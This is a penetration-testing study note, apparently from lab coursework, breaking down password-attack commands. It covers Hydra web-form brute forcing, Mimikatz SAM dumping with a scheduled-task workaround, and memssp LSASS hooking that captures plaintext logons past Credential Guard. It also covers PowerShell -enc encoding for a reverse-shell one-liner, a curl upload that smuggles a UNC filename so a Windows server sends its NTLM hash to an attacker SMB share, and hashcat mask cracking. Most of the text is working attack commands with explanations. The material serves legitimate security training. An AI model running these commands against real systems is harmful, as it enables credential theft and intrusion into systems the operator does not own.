# Password Attacks — Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. The "why does this work" layer under [[Password Attacks]] and [[Password Attacks|Command Appendix]].

---

## Hydra http-post-form: the three-field syntax

**Full command:**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.158.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

**Piece by piece:**
- `http-post-form` → tells Hydra the target is a form-based login that uses HTTP POST (not SSH, not RDP, not basic auth)
- `"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` → three fields separated by `:`:
  1. **Path**: `/index.php` -- the form's `action` attribute, where the POST goes
  2. **Body**: `fm_usr=user&fm_pwd=^PASS^` -- the POST body with `^USER^`/`^PASS^` as placeholders; Hydra substitutes the wordlist entry into `^PASS^` for each attempt
  3. **Failure string**: `Login failed. Invalid` -- a string that appears in the response when authentication FAILS; Hydra flags any response that does NOT contain this string as a successful login
- `-l user` → single username (lowercase `-l`); `-L file` for a list
- `-P rockyou.txt` → password list (uppercase `-P`); `-p password` for a single password

**Why the failure string, not a success string:**
Hydra tests thousands of passwords. You can't predict what success looks like (it varies per app), but the failure message is consistent and appears on every wrong attempt. Hydra inverts the logic: everything that does NOT show the failure string is flagged as a hit.

**Where this comes from:** Burp Suite → intercept a failed login → note the form's `action`, field names, and the failure message in the response body. Use Burp Repeater to test that the failure string is reliably present on failures and absent on success before running Hydra.

**Common failure modes:**
- Wrong failure string: if you pick a string that also appears on the success page (e.g. the word "password" in a welcome message), Hydra marks everything as failed and runs forever
- Session cookie not carried: Hydra follows redirects with the session cookie automatically, but confirm your failure string appears on the POST-redirect page, not the pre-redirect one
- CSS class as indicator: strings like `fm-login-page` appear in inline CSS on every page including the logged-in view -- Hydra sees it everywhere, marks everything as a failure

🔁 [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3 HTTP POST form lab]]

---

## Mimikatz privilege chain: why the three-step sequence

**Full command sequence:**
```
privilege::debug
token::elevate
lsadump::sam
```

**Piece by piece:**
- `privilege::debug` → enables `SeDebugPrivilege` on the current process. This privilege allows a process to open handles to other processes even if those processes belong to a different user. Without it, Mimikatz can't touch LSASS (owned by SYSTEM). The `Privilege '20' OK` response is the confirmation -- 20 is the privilege constant for SeDebugPrivilege.
- `token::elevate` → Mimikatz looks for a SYSTEM token on the machine (every Windows machine has one -- the Session 0 SYSTEM processes) and impersonates it by injecting a thread with that token. After this call, Mimikatz's thread runs as NT AUTHORITY\SYSTEM. This is necessary because the SAM database registry key (`HKLM\SAM`) only accepts reads from SYSTEM, not from an admin user.
- `lsadump::sam` → reads the SAM database through the SYSTEM token's handle. Outputs NTLM hashes for every local user account.

**The Windows Server 2022 exception:**
On Server 2022, `lsadump::sam` fails with access denied even after `token::elevate`. The issue: SAM registry access is checked against the **primary process token** (the user who launched the process), not the thread impersonation token. `token::elevate` sets a thread token (impersonation), not a process token. The check uses the primary token -- your original user -- which is not SYSTEM.

Fix: launch Mimikatz as a scheduled task running under an admin user's primary token:
```cmd
schtasks /create /tn "HashDump" \
  /tr "cmd /c C:\tools\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit > C:\tools\out.txt 2>&1" \
  /sc once /st 00:00 \
  /ru <machine>\<adminuser> /rp "<password>" /f
schtasks /run /tn "HashDump"
```
- `/ru <user> /rp <password>` → the scheduled task authenticates as that user. Their token becomes the PRIMARY token of the new `cmd.exe` process. The SAM registry check now sees SYSTEM (via `token::elevate`) with a primary process context from that admin user, which is enough.
- `> C:\tools\out.txt 2>&1` → redirect stdout + stderr to a file because the task runs non-interactively (no console window).

**Where this comes from:** Mimikatz's own `wiki` command explains the module hierarchy. The impersonation-vs-primary-token distinction is covered in Windows security architecture docs (access token impersonation levels). The schtask workaround is documented in various red team references; confirmed working in [[Password Attacks#16.3.2. Passing NTLM|16.3.2 VM Group 1 lab]].

🔁 [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]

---

## PowerShell -enc requires UTF-16LE base64, not plain ASCII

**Full command (Python encoding):**
```python
import base64
cmd = '<reverse-shell-oneliner>'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
```

**Piece by piece:**
- `cmd.encode('utf-16-le')` → encodes the string as UTF-16 Little Endian (every character becomes 2 bytes: the ASCII byte followed by a null byte). This is what PowerShell actually reads when decoding a `-enc` payload. PowerShell's internal string representation is UTF-16LE.
- `base64.b64encode(...)` → standard base64 encodes the UTF-16LE bytes
- `.decode()` → converts the resulting `bytes` object to a Python string so it can be printed

**Why plain ASCII base64 doesn't work:**
If you base64-encode a plain ASCII string and pass it to `powershell -enc`, PowerShell decodes the base64 back to bytes, then interprets those bytes as UTF-16LE. Every other byte is `\x00`, so every character pair decodes to garbage Unicode. The command fails silently or with a parser error.

**Why not use `pwsh -c` directly on Linux:**
Nested quotes inside a shell string (`$`, `"`, backticks) are expanded by bash before PowerShell sees them. Escaping all of them reliably for a long reverse shell one-liner is fragile -- a single unescaped character breaks everything. Writing the script to a file (heredoc with `'PYEOF'` delimiter to prevent expansion) and running with `python3 /path/to/script.py` is cleaner and reproducible.

**Where this comes from:** PowerShell documentation for the `-EncodedCommand` parameter. Confirmed in [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 VM Group 1]] where `pwsh -c` failed with `ParserError: Unexpected token`.

🔁 [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4]]

---

## memssp: why SSPI-layer intercept beats Credential Guard

**Full command sequence:**
```
privilege::debug
misc::memssp
# (exit Mimikatz)
type C:\Windows\System32\mimilsa.log
```

**Piece by piece:**
- `misc::memssp` → patches LSASS memory to insert a fake Security Support Provider (SSP). An SSP is a DLL that implements the `SpAcceptCredentials` function -- called by the LSA whenever it accepts credentials for a new authentication event. The injected SSP's `SpAcceptCredentials` is a hook: it writes the plaintext credentials to `mimilsa.log`, then calls the original function.
- This fires **at the SSPI call boundary** -- the one point in the authentication flow where credentials exist in plaintext inside VTL0 (normal Windows) before Credential Guard can encrypt them and hand them to LSAISO.exe in VTL1.
- Credential Guard's encryption happens AFTER `SpAcceptCredentials` returns -- so the hook captures credentials before the guard has any chance to act.
- The hook persists in LSASS memory until the system reboots (or LSASS restarts). It survives Mimikatz being closed.

**Why only NEW authentication events are captured:**
memssp hooks into the code path for accepting credentials. Existing sessions are already authenticated -- their credentials passed through the SSPI layer before the hook was installed, so they're not re-captured. Only the next login/reconnect event will appear in the log.

**Testing whether the injection is still alive:**
```cmd
runas /user:<domain>\<user> cmd
# enter the password when prompted
type C:\Windows\System32\mimilsa.log
# if the runas credentials appear, the hook is live
```
If `mimilsa.log` doesn't update after the runas, the injection may have been disrupted (double-injection issue, LSASS restart). Re-inject with a fresh Mimikatz session.

**The double-injection issue:**
Running `misc::memssp` twice doesn't stack two hooks -- it can corrupt the first hook's function pointer or otherwise break the chain. If you've already injected and the log stops updating, reboot the machine and re-inject once.

**Where this comes from:** Mimikatz source code (`misc::memssp` module, `memssp.c`), Benjamin Delpy's blog posts. The VTL0/VTL1 architecture is from Microsoft's Credential Guard documentation. Confirmed in [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]].

🔁 [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]

---

## UNC filename injection via Go's filepath.Join on Windows

**Full command:**
```bash
curl -v -X POST http://marketingwk01:8000/upload \
  -F "myFile=@/home/kali/test.html;filename=//192.168.45.219/share/test.html"
```

**Piece by piece:**
- `-F "myFile=@...;filename=..."` → multipart form upload; `@/path` is the file content, `filename=` overrides the filename in the `Content-Disposition` header. The server sees `//192.168.45.219/share/test.html` as the filename.
- The Go server calls `filepath.Join(uploadDir, header.Filename)` where `header.Filename` is the attacker-controlled filename. On Windows, `filepath.Join` converts `/` to `\` and recognises `\\server\share\...` as an absolute UNC path, discarding `uploadDir` entirely.
- The Go server then calls `os.Create("\\\\192.168.45.219\\share\\test.html")` -- an outbound SMB connection to the Kali machine.
- Windows initiates NTLM authentication for that SMB connection, and Responder captures the Net-NTLMv2 hash from the server process's service account.

**Why forward slashes, not backslashes:**
`\\server\share` contains backslashes. Some upload handlers or middleware strip or escape backslashes from multipart filenames (treating them as path separators to sanitise). The forward-slash equivalent `//server/share` reaches `filepath.Join` intact, which then normalises both forms to the same UNC path internally.

**How to confirm the server is vulnerable before attempting:**
```bash
curl http://<target>/nul   # Windows NUL device -- returns 200 OK (Go passes it to OS)
curl http://<target>/aux   # Windows AUX device -- hangs (serial port, blocks on read)
```
If both behave this way, the handler passes paths to OS calls without sanitising Windows reserved device names -- a strong indicator that the UNC filename injection will work.

**Where this comes from:** Go's `path/filepath` package documentation, Windows UNC path specification. Discovered empirically in [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2 lab]].

🔁 [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]

---

## Hashcat mask attack (-a 3): the character-class placeholder system

**Full command:**
```bash
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?d?s'
```

**Piece by piece:**
- `-a 3` → attack mode 3 = "mask attack." Hashcat generates every possible string matching the mask pattern rather than reading from a wordlist (-a 0) or applying rules (-a 0 -r).
- `-m 0` → hash mode; 0 = MD5. Swap for the target hash type.
- `'?u?l?l?l?l?d?d?s'` → the mask itself. Each `?x` is a character-class placeholder:
  - `?u` → uppercase letters (A-Z)
  - `?l` → lowercase letters (a-z)
  - `?d` → digits (0-9)
  - `?s` → special characters (space and common symbols: `!"#$%&'()*+,-./:;<=>?@[\]^_` etc.)
  - `?a` → all of the above combined (?l + ?u + ?d + ?s)
  - `?b` → all bytes 0x00-0xFF
- The mask above generates every 8-character string of the form: 1 uppercase + 4 lowercase + 2 digits + 1 special char. At the charset sizes involved this is ~1 trillion candidates — useful when you know password-policy constraints.
- `--stdout` → instead of cracking, print every candidate the mask would generate. Useful for piping to another tool or previewing what a mask produces before a long run.

**Where this comes from:** Hashcat's own wiki (`hashcat.net/wiki/doku.php?id=mask_attack`) explains all placeholder codes. `hashcat --help | grep -A5 "Charsets"` lists them locally.

**Common mistake:** Putting the mask in double quotes on Linux — bash expands `?` as a single-character glob wildcard. Always single-quote masks.

🔁 [[Password Attacks (HTB Supplementary)#PA.5 Hashcat Mask Attack (-a 3)|PA.5]]

---

## BitLocker VHD mount chain: why losetup + dislocker + mount are all needed

**Full command sequence:**
```bash
sudo losetup -f -P bitlocker.vhd
sudo losetup -a          # note which /dev/loopX it used, e.g. /dev/loop0
sudo dislocker -uPASS /dev/loop0p1 /mnt/bitlocker_raw/
sudo mount -o loop /mnt/bitlocker_raw/dislocker-file /mnt/bitlocker_cleartext/
```

**Piece by piece:**
- `losetup -f -P bitlocker.vhd` → **loop device setup.** Linux can't mount a raw `.vhd` file directly. `losetup` creates a block device (`/dev/loopX`) backed by the file. `-f` picks the first free loop device automatically. `-P` scans for partitions inside the VHD and creates sub-devices like `/dev/loop0p1` for each partition (needed because the VHD has a partition table, not just raw filesystem data).
- `dislocker -uPASS /dev/loop0p1 /mnt/bitlocker_raw/` → **BitLocker decryption layer.** `dislocker` reads the BitLocker metadata from the partition, uses the password (`-u` flag) to decrypt the Volume Master Key, and FUSE-mounts the decrypted virtual disk at the given mountpoint. The result is `/mnt/bitlocker_raw/dislocker-file` — a virtual block device file representing the decrypted NTFS volume.
- `mount -o loop /mnt/bitlocker_raw/dislocker-file /mnt/bitlocker_cleartext/` → **NTFS mount.** `dislocker-file` is itself a block-device image, not a directory. `mount -o loop` wraps it in another loop device so the kernel can mount the NTFS filesystem inside it normally.

**Why three steps instead of one:**
Each tool solves a different abstraction problem. The OS needs a block device (losetup solves this). The block device's content is encrypted (dislocker solves this). The decrypted content is a filesystem image, not yet a directory tree (mount solves this). None of the three tools does the other two's job.

**Where this comes from:** dislocker man page (`man dislocker`), Linux `losetup` man page. The `-uPASS` syntax vs `-u PASS` (with space) varies by version — check `dislocker --help` on your Kali version if it fails.

🔁 [[Password Attacks (HTB Supplementary)#PA.4 BitLocker VHD Decryption Chain|PA.4]]

#### Tags: #CommandBreakdowns #PasswordAttacks #Hydra #Mimikatz #memssp #NetNTLMv2 #PowerShell #UNCInjection #CredentialGuard #Hashcat #MaskAttack #BitLocker #losetup #dislocker
